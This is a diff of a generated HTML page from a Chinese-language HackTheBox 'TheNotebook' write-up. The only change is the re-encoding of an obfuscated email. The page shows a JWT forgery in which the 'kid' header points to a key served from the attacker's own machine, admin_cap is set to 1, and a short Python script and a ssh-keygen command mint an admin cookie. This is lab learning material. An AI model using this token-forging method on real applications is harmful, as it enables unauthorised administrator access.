@@ -276,7 +276,7 @@
 <img src="/2021/06/03/Hackthebox/Hackthebox-TheNotebook/e55f4243-96e4-4a83-9af4-23bf743e8890.png" class>
 
 <p>{“typ”:”JWT”,”alg”:”RS256”,”kid”:”<a href="http://localhost:7070/privKey.key&quot;%7D" target="_blank" rel="noopener">http://localhost:7070/privKey.key&quot;}</a></p>
-<p>{“username”:”Lucifiel”,”email”:”<a href="mailto:&#76;&#x75;&#99;&#x69;&#102;&#105;&#x65;&#x6c;&#64;&#101;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#76;&#x75;&#99;&#x69;&#102;&#105;&#x65;&#x6c;&#64;&#101;&#x6d;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a>“,”admin_cap”:false}</p>
+<p>{“username”:”Lucifiel”,”email”:”<a href="mailto:&#76;&#x75;&#99;&#105;&#x66;&#105;&#101;&#x6c;&#64;&#x65;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#76;&#x75;&#99;&#105;&#x66;&#105;&#101;&#x6c;&#64;&#x65;&#x6d;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a>“,”admin_cap”:false}</p>
 <p>解密出来的内容，我们会发现，上面有一个JWT，我感觉这是突破口</p>
 <p><a href="https://jwt.io/introduction" target="_blank" rel="noopener">https://jwt.io/introduction</a></p>
 <p>直接搜索JWT 找到了一个官网并且有相关的介绍，我们发现JWT是一个JSON 网络令牌</p>
@@ -290,7 +290,7 @@
 <img src="/2021/06/03/Hackthebox/Hackthebox-TheNotebook/517c99cf-27e9-4429-b0d7-7f82171703b6.png" class>
 
 <p>Headers &#x3D; {“typ”:”JWT”,”alg”:”RS256”,”kid”:”<a href="http://10.10.14.184/privKey.key&quot;%7D" target="_blank" rel="noopener">http://10.10.14.184/privKey.key&quot;}</a></p>
-<p>Payload &#x3D; {“username”:”Lucifiel”,”email”:”<a href="mailto:&#x4c;&#117;&#99;&#x69;&#x66;&#x69;&#101;&#x6c;&#x40;&#101;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x4c;&#117;&#99;&#x69;&#x66;&#x69;&#101;&#x6c;&#x40;&#101;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a>“,”admin_cap”:1}</p>
+<p>Payload &#x3D; {“username”:”Lucifiel”,”email”:”<a href="mailto:&#x4c;&#x75;&#x63;&#x69;&#x66;&#x69;&#x65;&#108;&#64;&#x65;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x4c;&#x75;&#x63;&#x69;&#x66;&#x69;&#x65;&#108;&#64;&#x65;&#x6d;&#97;&#105;&#108;&#46;&#99;&#111;&#x6d;</a>“,”admin_cap”:1}</p>
 <p>但是这里的signature也就是密钥却是加密的，咱们无法修改也无法读取，怎么办呢？当然是Google啦</p>
 <p><a href="https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9" target="_blank" rel="noopener">https://gist.github.com/ygotthilf/baa58da5c3dd1f69fae9</a></p>
 <p>ssh-keygen -t rsa -b 2048 -m PEM -f privKey.key</p>
@@ -321,7 +321,7 @@
 <p>import jwt</p>
 <p>key &#x3D; open(“privKey.key.pub”, ‘r’).read()</p>
 <p>headers &#x3D; {“typ”: “JWT”, “alg”: “RS256”, “kid”: “<a href="http://10.10.14.184/privKey.key&quot;%7D" target="_blank" rel="noopener">http://10.10.14.184/privKey.key&quot;}</a></p>
-<p>payload &#x3D; {“username”: “Lucifiel”, “email”: “<a href="mailto:&#x4c;&#117;&#x63;&#x69;&#x66;&#x69;&#x65;&#108;&#x40;&#101;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;">&#x4c;&#117;&#x63;&#x69;&#x66;&#x69;&#x65;&#108;&#x40;&#101;&#x6d;&#97;&#x69;&#108;&#x2e;&#x63;&#111;&#109;</a>“, “admin_cap”: 1}</p>
+<p>payload &#x3D; {“username”: “Lucifiel”, “email”: “<a href="mailto:&#76;&#117;&#99;&#x69;&#102;&#105;&#x65;&#x6c;&#x40;&#x65;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;">&#76;&#117;&#99;&#x69;&#102;&#105;&#x65;&#x6c;&#x40;&#x65;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#x6d;</a>“, “admin_cap”: 1}</p>
 <p>print(jwt.encode(payload, headers&#x3D;headers, key&#x3D;key, algorithm&#x3D;’RS256’))</p>
 <p>使用该脚本即可生成我们所需要的cookie</p>
 <p>在咱们本地使用python3开启一个http服务器</p>
